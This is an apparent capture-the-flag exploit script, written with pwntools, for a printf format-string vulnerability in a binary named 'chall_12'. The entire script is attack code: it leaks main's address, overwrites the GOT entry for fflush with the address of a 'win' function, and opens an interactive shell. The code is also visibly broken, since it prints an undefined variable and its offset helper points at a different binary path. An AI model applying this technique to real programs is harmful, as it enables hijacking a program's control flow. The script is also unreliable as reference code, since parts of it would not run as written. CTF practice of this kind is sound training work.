# printf vuln
# similar to challenge 11, reuse offset function 

p = process('./chall_12')
binary = ELF('./chall_12')
context.arch = 'amd64'

def getOffset(payload): 
	p = process('/chall_11')
	p.sendline()
	p.sendline(payload)
	return p.recvall()

offset = FmtStr(getOffset)

p.recvuntil('Just a single second: ')
mainAddress = int(p.recvline().strip(),16)

print(realmain)

winLocation = binary.sym.main - binary.sym.win
fflushLocation = binary.got.fflush - binary.sym.main

payload = b''
payload = fmtstr_payload(offset,{mainAddress + fflushLocation : mainAddress - winLocation})

print(payload)
p.sendline('junk')

print('[*] Launch /bin/sh')
p.send(payload)
p.interactive()